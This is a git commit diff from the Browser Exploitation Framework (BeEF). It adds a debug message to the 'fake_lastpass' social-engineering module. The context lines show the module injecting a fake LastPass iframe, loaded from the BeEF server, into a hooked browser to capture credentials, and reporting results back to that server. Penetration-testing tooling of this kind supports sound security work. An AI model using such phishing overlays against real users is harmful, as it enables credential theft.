5b771274fbd3340b5fb0186cb9f6d9d0271e4a78
Brendan Coles <bcoles@gmail.com>
2018-07-19 07:07:49 +0000

    Revent client jQuery from 3.3.1 to 1.12.4

--- modules/social_engineering/fake_lastpass/command.js
+++ modules/social_engineering/fake_lastpass/command.js
@@ -25,6 +25,7 @@ beef.execute(function() {
 		beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/lp/index.html','id':'LPIFRAME'}, {'width':'294px','height':'352px','position':'fixed','right':'5px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'1px solid white','overflow':'hidden'}); 
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
 	} else {
+		beef.debug('[Fake LastPass] Unspported browser');
 		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', beef.are.status_error());
 	}
 
